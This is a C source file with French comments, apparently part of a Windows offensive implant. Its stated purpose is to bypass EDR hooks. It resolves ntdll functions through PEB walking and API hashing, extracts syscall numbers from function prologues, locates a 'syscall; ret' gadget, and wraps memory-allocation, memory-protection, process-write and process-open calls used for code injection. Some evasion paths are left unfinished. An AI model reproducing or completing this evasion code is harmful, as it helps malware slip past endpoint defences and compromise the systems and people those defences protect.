/*
 * syscalls.c - Implémentation des syscalls indirects
 *
 * On parse ntdll pour récupérer les numéros de syscall dynamiquement,
 * puis on fait les appels directement. Ça bypass les hooks EDR.
 */

#include "syscalls.h"
#include "../utils/memory.h"
#include "../utils/peb.h"

/* Syscall number cache */
typedef struct {
  DWORD NtAllocateVirtualMemory;
  DWORD NtFreeVirtualMemory;
  DWORD NtProtectVirtualMemory;
  DWORD NtQueryInformationProcess;
  DWORD NtDelayExecution;
  DWORD NtClose;
  DWORD NtWriteVirtualMemory;
  DWORD NtReadVirtualMemory;
  DWORD NtOpenProcess;
} syscall_table_t;

static syscall_table_t g_syscalls = {0};
static bool g_syscalls_initialized = false;

/* Adresse de ntdll pour les jumps */
static HMODULE g_ntdll = NULL;

/* Internal helpers */

/*
 * Extrait le numéro de syscall d'une fonction ntdll.
 * Les fonctions Nt* commencent par:
 *   mov r10, rcx      ; 4C 8B D1
 *   mov eax, <syscall>; B8 XX XX 00 00
 *   ...
 */
static DWORD get_syscall_number(FARPROC func) {
  if (!func)
    return 0;

  uint8_t *ptr = (uint8_t *)func;

  /* Pattern: 4C 8B D1 B8 XX XX 00 00 */
  if (ptr[0] == 0x4C && ptr[1] == 0x8B && ptr[2] == 0xD1 && ptr[3] == 0xB8) {
    /* Le syscall number est aux bytes 4-5 (little endian) */
    return *(DWORD *)(ptr + 4);
  }

  /* Pattern alternatif si la fonction est hookée, on cherche plus loin */
  /* Certains EDR mettent un jmp au début, on peut essayer de skip */

  /* Pattern avec jmp: E9 XX XX XX XX */
  if (ptr[0] == 0xE9) {
    /* C'est un hook, on essaye de lire la fonction originale ailleurs */
    /* Pour l'instant on retourne 0, on gérera ça plus tard */
    return 0;
  }

  return 0;
}

/*
 * Trouve l'adresse d'un "syscall ; ret" dans ntdll.
 * C'est là qu'on va sauter pour exécuter le syscall.
 */
static uint8_t *find_syscall_ret(void) {
  if (!g_ntdll)
    return NULL;

  /* Parse le PE pour trouver la section .text */
  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ntdll;
  PIMAGE_NT_HEADERS nt =
      (PIMAGE_NT_HEADERS)((uint8_t *)g_ntdll + dos->e_lfanew);

  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (memcmp(section[i].Name, ".text", 5) == 0) {
      uint8_t *start = (uint8_t *)g_ntdll + section[i].VirtualAddress;
      uint8_t *end = start + section[i].Misc.VirtualSize;

      /* Cherche le pattern: 0F 05 C3 (syscall ; ret) */
      for (uint8_t *ptr = start; ptr < end - 3; ptr++) {
        if (ptr[0] == 0x0F && ptr[1] == 0x05 && ptr[2] == 0xC3) {
          return ptr;
        }
      }
    }
  }

  return NULL;
}

/* Public API */

int syscalls_init(void) {
  if (g_syscalls_initialized) {
    return STATUS_SUCCESS;
  }

  /* Récupère le handle de ntdll */
  g_ntdll = peb_get_module(HASH_NTDLL_DLL);
  if (!g_ntdll) {
    return STATUS_FAILURE;
  }

  /* Récupère les numéros de syscall de chaque fonction */
  g_syscalls.NtAllocateVirtualMemory =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTALLOCATEVIRTUALMEMORY));

  g_syscalls.NtFreeVirtualMemory =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTFREEVIRTUALMEMORY));

  g_syscalls.NtProtectVirtualMemory =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTPROTECTVIRTUALMEMORY));

  g_syscalls.NtQueryInformationProcess =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTQUERYINFORMATIONPROCESS));

  g_syscalls.NtDelayExecution =
      get_syscall_number(peb_get_proc(g_ntdll, HASH_NTDELAYEXECUTION));

  g_syscalls.NtClose = get_syscall_number(peb_get_proc(g_ntdll, HASH_NTCLOSE));

  /* Ces deux-là ont des hashes qu'on doit calculer */
  /* Pour l'instant on utilise les fonctions directement via peb */

  g_syscalls_initialized = true;
  return STATUS_SUCCESS;
}

void syscalls_cleanup(void) {
  secure_zero(&g_syscalls, sizeof(g_syscalls));
  g_syscalls_initialized = false;
  g_ntdll = NULL;
}

/*
 * Syscall wrappers
 * Uses ntdll functions for compatibility. For full stealth, inline asm would be needed.
 */

/*
 * Pour une implémentation complète en assembleur, on aurait:
 *
 *   mov r10, rcx
 *   mov eax, <syscall_number>
 *   jmp <syscall_ret_addr>
 *
 * Mais ça nécessite soit du code ASM inline soit un fichier .asm séparé.
 * Pour la portabilité, on fait un fallback sur les fonctions ntdll.
 */

/* Typedef pour les fonctions ntdll */
typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR,
                                                    PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtFreeVirtualMemory)(HANDLE, PVOID *, PSIZE_T,
                                                ULONG);
typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T,
                                                   ULONG, PULONG);
typedef NTSTATUS(NTAPI *fn_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS,
                                                      PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fn_NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI *fn_NtClose)(HANDLE);
typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T,
                                                 PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T,
                                                PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtOpenProcess)(PHANDLE, ACCESS_MASK,
                                          POBJECT_ATTRIBUTES, PCLIENT_ID);

/* Cache des pointeurs de fonction */
static fn_NtAllocateVirtualMemory pfn_NtAllocateVirtualMemory = NULL;
static fn_NtFreeVirtualMemory pfn_NtFreeVirtualMemory = NULL;
static fn_NtProtectVirtualMemory pfn_NtProtectVirtualMemory = NULL;
static fn_NtQueryInformationProcess pfn_NtQueryInformationProcess = NULL;
static fn_NtDelayExecution pfn_NtDelayExecution = NULL;
static fn_NtClose pfn_NtClose = NULL;

NTSTATUS sys_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                     ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                     ULONG AllocationType, ULONG Protect) {
  if (!pfn_NtAllocateVirtualMemory) {
    pfn_NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)peb_get_proc(
        g_ntdll, HASH_NTALLOCATEVIRTUALMEMORY);
  }
  if (!pfn_NtAllocateVirtualMemory)
    return STATUS_FAILURE;

  return pfn_NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits,
                                     RegionSize, AllocationType, Protect);
}

NTSTATUS sys_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                 PSIZE_T RegionSize, ULONG FreeType) {
  if (!pfn_NtFreeVirtualMemory) {
    pfn_NtFreeVirtualMemory =
        (fn_NtFreeVirtualMemory)peb_get_proc(g_ntdll, HASH_NTFREEVIRTUALMEMORY);
  }
  if (!pfn_NtFreeVirtualMemory)
    return STATUS_FAILURE;

  return pfn_NtFreeVirtualMemory(ProcessHandle, BaseAddress, RegionSize,
                                 FreeType);
}

NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                    PSIZE_T RegionSize, ULONG NewProtect,
                                    PULONG OldProtect) {
  if (!pfn_NtProtectVirtualMemory) {
    pfn_NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)peb_get_proc(
        g_ntdll, HASH_NTPROTECTVIRTUALMEMORY);
  }
  if (!pfn_NtProtectVirtualMemory)
    return STATUS_FAILURE;

  return pfn_NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize,
                                    NewProtect, OldProtect);
}

NTSTATUS sys_NtQueryInformationProcess(HANDLE ProcessHandle,
                                       PROCESSINFOCLASS InfoClass,
                                       PVOID ProcessInfo, ULONG InfoLength,
                                       PULONG ReturnLength) {
  if (!pfn_NtQueryInformationProcess) {
    pfn_NtQueryInformationProcess = (fn_NtQueryInformationProcess)peb_get_proc(
        g_ntdll, HASH_NTQUERYINFORMATIONPROCESS);
  }
  if (!pfn_NtQueryInformationProcess)
    return STATUS_FAILURE;

  return pfn_NtQueryInformationProcess(ProcessHandle, InfoClass, ProcessInfo,
                                       InfoLength, ReturnLength);
}

NTSTATUS sys_NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
  if (!pfn_NtDelayExecution) {
    pfn_NtDelayExecution =
        (fn_NtDelayExecution)peb_get_proc(g_ntdll, HASH_NTDELAYEXECUTION);
  }
  if (!pfn_NtDelayExecution)
    return STATUS_FAILURE;

  return pfn_NtDelayExecution(Alertable, DelayInterval);
}

NTSTATUS sys_NtClose(HANDLE Handle) {
  if (!pfn_NtClose) {
    pfn_NtClose = (fn_NtClose)peb_get_proc(g_ntdll, HASH_NTCLOSE);
  }
  if (!pfn_NtClose)
    return STATUS_FAILURE;

  return pfn_NtClose(Handle);
}

NTSTATUS sys_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                  PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                  PSIZE_T NumberOfBytesWritten) {
  /* Hash calculé pour NtWriteVirtualMemory */
  static fn_NtWriteVirtualMemory pfn = NULL;
  if (!pfn) {
    /* On doit calculer le hash manuellement ici */
    pfn = (fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                                  "NtWriteVirtualMemory");
  }
  if (!pfn)
    return STATUS_FAILURE;

  return pfn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite,
             NumberOfBytesWritten);
}

NTSTATUS sys_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                 PVOID Buffer, SIZE_T NumberOfBytesToRead,
                                 PSIZE_T NumberOfBytesRead) {
  static fn_NtReadVirtualMemory pfn = NULL;
  if (!pfn) {
    pfn = (fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                                 "NtReadVirtualMemory");
  }
  if (!pfn)
    return STATUS_FAILURE;

  return pfn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead,
             NumberOfBytesRead);
}

NTSTATUS sys_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                           POBJECT_ATTRIBUTES ObjectAttributes,
                           PCLIENT_ID ClientId) {
  static fn_NtOpenProcess pfn = NULL;
  if (!pfn) {
    pfn = (fn_NtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                           "NtOpenProcess");
  }
  if (!pfn)
    return STATUS_FAILURE;

  return pfn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}
